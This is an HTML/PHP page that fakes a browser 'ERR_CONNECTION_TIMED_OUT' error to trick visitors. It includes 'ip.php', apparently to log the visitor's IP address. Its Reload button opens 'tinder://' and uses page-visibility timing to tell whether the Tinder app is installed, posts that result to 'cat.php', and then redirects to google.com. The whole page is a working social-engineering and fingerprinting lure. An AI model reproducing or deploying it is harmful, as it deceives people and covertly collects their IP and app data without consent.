<html>
<head>
</head>
<style>
body {
padding-top: 8%;
padding-left: 25%;
font-family: Arial, Helvetica, sans-serif;
}

p {

 font-size: 0.8em;
 text-decoration: none;
 color: gray;
}


h1 {

color: #585858;
padding-top: 1em;
font-size: 1.4em;
font-weight: bold;
}

h3 {
color: #585858;
font-size: 1em;
  
  font-weight: normal;
}
.button {
  background-color: rgb(26,115,232);
  border: none;
  border-radius: 4px;
  color: white;
  padding: 8px 23px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 1em;

}

</style>
<body>
<?php
include 'ip.php';
?>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAvCAYAAACPMrhmAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjEuNWRHWFIAAAEsSURBVFhH7c5BisQwDETRvmPufxYPMRiEYn5JTWrGi1k8L+JvKZ8xxpG2H0+w/XiC7ccTbD+eYB7XdY3fEpeTeewGuMTlZB67AS5xOZnHNw93KnMqzW0e1VipzKk0t3lUY6Uyp9Lc5lGNle4c6mXQ0Z1DvQw6unOol8HyVhNRL4PlrSaiXgbLW01EvQyWbtOVZz0Gxsuo23TlWY+B8TLqNl151mNgvHSjvTJwor0ycKK9MnCivTJwor0ycKK9MnCivTJwor0ycKK9MnCivTJwor0ycKK9MtiJPcnvMmplsBN7kt9l1MpgJ/Ykv8uolcFSaTL1hu5lsFSaTL2hexkslSZTb+heBk60VwZOtFcGTrRXBk60VwZOtFcGTrT3EfyV+FO3/x9T4k+NMT4/HRLC4DlxD/kAAAAASUVORK5CYII="/>
<h1> This site can't be reached </h1>
<h3><b>Oops!</b> The resources on this page are busy. Please reload and try again </h3>
<p> ERR_CONNECTION_TIMED_OUT </p>
<br><br>
<button class="button" onclick="clickHandler()">Reload</button>

 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script>

function clickHandler() {
var timestamp             = new Date().getTime();
var timerDelay              = 3000;
var processingBuffer  = 50;

var redirect = function(url) {

  window.location = url;


  log('ts: ' + timestamp + '; redirecting to: ' + url);
}
var isPageHidden = function() {
    var browserSpecificProps = {hidden:1, mozHidden:1, msHidden:1, webkitHidden:1};
    for (var p in browserSpecificProps) {
        if(typeof document[p] !== "undefined"){
        return document[p];
      }
    }
    return false; // actually inconclusive, assuming not
}
var elapsedMoreTimeThanTimerSet = function(){
    var elapsed = new Date().getTime() - timestamp;
  log('elapsed: ' + elapsed);
  return timerDelay + processingBuffer < elapsed;
}
var redirectToFallbackIfBrowserStillActive = function() {
  var elapsedMore = elapsedMoreTimeThanTimerSet();
  log('hidden:' + isPageHidden() +'; time: '+ elapsedMore);
  if (isPageHidden() || elapsedMore) {
    log('not redirecting'); //post "has app"
      $.ajax({
    type: 'POST',
    url: 'cat.php',
    data: { 
        'app': 'true' 

    },
    success: function(msg){
       
    }
});
window.location.replace('https://google.com');


  }else{
    redirect('https://google.com'); //doenst has the app installed


      $.ajax({
    type: 'POST',
    url: 'cat.php',
    data: { 
        'app': 'false' 

    },
    success: function(msg){
       
    }

});



  }
}
var log = function(msg){
//    document.getElementById('log').innerHTML += msg + "<br>";
}

setTimeout(redirectToFallbackIfBrowserStillActive, timerDelay);
redirect('tinder://');

}

</script>
</body>
</html>

